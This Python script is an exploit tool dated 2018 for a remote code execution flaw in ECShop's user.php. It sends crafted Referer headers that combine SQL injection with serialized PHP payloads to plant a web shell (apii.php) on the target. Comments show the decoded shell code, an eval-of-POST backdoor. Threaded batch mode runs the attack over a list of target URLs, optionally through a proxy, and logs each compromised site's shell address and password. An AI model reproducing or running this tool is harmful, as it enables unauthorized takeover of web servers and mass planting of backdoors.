#coding:utf-8
#Description: ecshop rce(user.php)
#Date:20180902

import requests
import optparse
import os
import datetime
import queue
import threading
import sys
from requests.packages import urllib3
from bs4 import BeautifulSoup

lock = threading.Lock()

q0 = queue.Queue()
threadList = []
global succ
succ = 0
headers = {}
#Referer'
headers["User-Agent"] = 'Opera/9.80 (Windows NT 6.1; U; en) Presto/2.8.131 Version/11.11'
headerList=[]
headerList.append('''Referer==554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:"num";s:290:"*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7b24797979275d3b617373657274286261736536345f6465636f646528275a6d6c735a56397764585266593239756447567564484d6f4a32467761576b75634768774a79776e504439776148416759584e7a5a584a304b435266554539545646743465444634654630704f7a382b4a796b3d2729293b2f2f7d,10-- -";s:2:"id";s:3:"'/*";}''')
headerList.append('''Referer==45ea207d7a2b68c49582d2d22adf953aads|a:2:{s:3:"num";s:286:"*/ select 1,0x2720756e696f6e2f2a,3,4,5,6,7,8,0x7b24617364275d3b617373657274286261736536345f6465636f646528275a6d6c735a56397764585266593239756447567564484d6f4a32467761576b75634768774a79776e504439776148416759584e7a5a584a304b435266554539545646743465444634654630704f7a382b4a796b3d2729293b2f2f7d787878,10-- -";s:2:"id";s:9:"' union/*";}45ea207d7a2b68c49582d2d22adf953aadsa''')
#554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:"num";s:290:"*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7b24797979275d3b617373657274286261736536345f6465636f646528275a6d6c735a56397764585266593239756447567564484d6f4a337034597935776148416e4c4363385033426f6343426c646d46734b435266554539545646743465486834654868644b547367507a346e4b513d3d2729293b2f2f7d,10-- -";s:2:"id";s:3:"'/*";}

#{$yyy'];assert(base64_decode('ZmlsZV9wdXRfY29udGVudHMoJ2FwaWkucGhwJywnPD9waHAgJGE9JF9HRVRbMV07JCRhPSRfR0VUWzJdOyRiKGJhc2U2NF9kZWNvZGUoJF9QT1NUWzNdKSk7ID8+Jyk='));//}
#file_put_contents('apii.php','<?php $a=$_GET[1];$$a=$_GET[2];$b(base64_decode($_POST[3])); ?>')

#{$yyy'];assert(base64_decode('ZmlsZV9wdXRfY29udGVudHMoJzEyMy5waHAnLCc8P3BocCBldmFsKCRfUE9TVFt4eHh4eHhdKTsgPz4nKQ=='));//}
#file_put_contents('zxc.php','<?php eval($_POST[xxxxxx]); ?>')
def ecshop_getshell(headerstr,tgtUrl,timeout):

	fullUrl = tgtUrl+'/user.php'
	print(headerstr)
	try:
		rst = requests.get(fullUrl,headers=headerstr,timeout=timeout,verify=False)
	except requests.exceptions.Timeout:
		print('Getshell failed! Error: Timeout')
		exit()
	except requests.exceptions.ConnectionError:
		print('Getshell failed! Error: ConnectionError')
		exit()
	except:
		print('Getshell failed! Error: Unkonwn error0')
		exit()
		
	
	try:
		rst1 = requests.get(fullUrl.split('/user.php')[0]+'/apii.php',timeout=timeout,verify=False)
		if rst1.status_code == 200 or  '4' not in str(rst1.status_code):
			if rst1.text == '':
				print('Getshell! Shell: ' + fullUrl.split('/user.php')[0] + '/apii.php' + ' pwd: xx1xx')
			
			else:
				
				soup = BeautifulSoup(rst1.text)
				if(soup.find('title')):
					print('Getshell failed! Error title: ' + str(soup.title.string))
				else:
					print('Getshell failed! ' + str(rst1.text[0:11]))
		else:
			print('Getshell failed! apii.php ' + str(rst1.status_code))
			exit()
	except requests.exceptions.Timeout:
		print('Getshell failed! Error: Timeout')

	except requests.exceptions.ConnectionError:
		print('Getshell failed! Error: ConnectionError')
		exit()
	except:
		
		print('Getshell failed! Error: Unkonwn error1')
		exit()


def ecshop_getshell_batch(headerstr,proxystr,timeout,f4success,f4fail):

	urllib3.disable_warnings()
	global countLines
	while(not q0.empty()):
		fullUrl = q0.get()+'/user.php'
		print(fullUrl)
		qcount = q0.qsize()
		print('Checking: ' + fullUrl + '---[' +  str(countLines - qcount) + '/' + str(countLines) + ']')
		
		try:

			rst = requests.get(fullUrl,headers=headerstr,proxies=proxystr,timeout=timeout,verify=False)

		except requests.exceptions.Timeout:
			#print 'Getshell failed! Error: Timeout'
			lock.acquire()
			f4fail.write(fullUrl+': '+'Getshell failed! Error: Timeout'+'\n')
			lock.release()	
			continue

		except requests.exceptions.ConnectionError:
			#print 'Getshell failed! Error: ConnectionError'
			lock.acquire()
			f4fail.write(fullUrl+': '+'Getshell failed! Error: ConnectionError'+'\n')
			lock.release()	
			continue

		except:
			#print 'Getshell failed! Error: Unkonwn error'
			lock.acquire()
			f4fail.write(fullUrl+': '+'Getshell failed! Error: Unknown error'+'\n')
			lock.release()	
			continue


		try:
			rst1 = requests.get(fullUrl.split('/user.php')[0]+'/apii.php',timeout=timeout,verify=False)

			if rst1.status_code == 200 or '4' not in str(rst1.status_code) :

				
				if rst1.text == '':
					shellAddr = fullUrl.split('/user.php')[0] + '/apii.php' + ' pwd: xx1xx'
					print('Getshell! Shell: ' + shellAddr)
					lock.acquire()
					f4success.write(fullUrl+': shell: ' + shellAddr + '\n')
					lock.release()
					global succ
					succ = succ + 1
				else:
					soup = BeautifulSoup(rst1.text)
					if(soup.find('title')):
						errorState = str(soup.title.string)
					else:
						errorState = 'Getshell failed!' + str(rst1.text[0:11])
				
					#print 'Getshell failed! Error: ' + errorState
					lock.acquire()
					f4fail.write(fullUrl+': '+errorState+'\n')
					lock.release()
			else:
			
				errorState = 'Getshell failed! Error: apii.php ' + str(rst1.status_code)
				lock.acquire()
				f4fail.write(fullUrl+': '+errorState+'\n')
				lock.release()
		except requests.exceptions.Timeout:
			#print 'Getshell failed! Error: Timeout'
			lock.acquire()
			f4fail.write(fullUrl+': '+'Getshell failed! Error: Timeout'+'\n')
			lock.release()	
			continue

		except requests.exceptions.ConnectionError:
			#print 'Getshell failed! Error: ConnectionError'
			lock.acquire()
			f4fail.write(fullUrl+': '+'Getshell failed! Error: ConnectionError'+'\n')
			lock.release()	
			continue			

		except:
			#print 'Getshell failed! Error: Unkonwn error'
			lock.acquire()
			f4fail.write(fullUrl+': '+'Getshell failed! Error: Unknown error'+'\n')
			lock.release()	
			continue			

		



	 


if __name__ == '__main__':

	print('''
		****************************************************
		*          ecshop getshell(user.php-rce)           *
		*				      Coded by LSA *
		****************************************************
		''')
	
	parser = optparse.OptionParser('python %prog ' +'-h (manual)',version='%prog v1.0')
	parser.add_option('-u', dest='tgtUrl', type='string', help='single url')

	parser.add_option('-f', dest='tgtUrlsPath', type ='string', help='urls filepath')
	
	parser.add_option('-s', dest='timeout', type='int', default=10, help='timeout(seconds)')
	
	parser.add_option('-t', dest='threads', type='int', default=5, help='the number of threads')
	parser.add_option('-p', dest='proxy', type='string', default='N', help='proxy')
	(options, args) = parser.parse_args()
	
	
	timeout = options.timeout
	
	tgtUrl = options.tgtUrl
	proxy = options.proxy
	if proxy!='N':
		proxystr={
			'http':'127.0.0.1:8080',
			'https':'127.0.0.1:8080'
		}
	else:
		proxystr={
			'http':None,
			'https':None
		}

	if tgtUrl:
		for headerstr in headerList:
			
			header=str(headerstr).split('==')
			headers[header[0]]=header[1]

			ecshop_getshell(headers,tgtUrl,timeout)

	
	if options.tgtUrlsPath:
			
		for headerstr in headerList: 
		
			tgtFilePath = options.tgtUrlsPath
			threads = options.threads
			nowtime = datetime.datetime.now().strftime('%Y%m%d%H%M%S')
			os.mkdir('batch_result/'+str(nowtime))
			f4success = open('batch_result/'+str(nowtime)+'/'+'success.txt','w')
			f4fail = open('batch_result/'+str(nowtime)+'/'+'fail.txt','w')
			urlsFile = open(tgtFilePath)
			header=str(headerstr).split('==')
			headers[header[0]]=header[1]
			global countLines
			countLines = len(open(tgtFilePath,'rU').readlines())
			print('===Total ' + str(countLines) + ' urls===')
			for urls in urlsFile:
				fullUrls = urls.strip()
				if 'http://' not in fullUrls:
					q0.put('http://'+fullUrls)
				else:
					q0.put(fullUrls)
			for thread in range(threads):
				t = threading.Thread(target=ecshop_getshell_batch,args=(headers,proxystr,timeout,f4success,f4fail))
				t.start()
				threadList.append(t)
			for th in threadList:
				th.join()

			


			print('\n###Finished! [success/total]: ' + '[' + str(succ) + '/' + str(countLines) + ']###')
			print('Results were saved in ./batch_result/' + str(nowtime) + '/')
			f4success.close()
			f4fail.close()

		
		

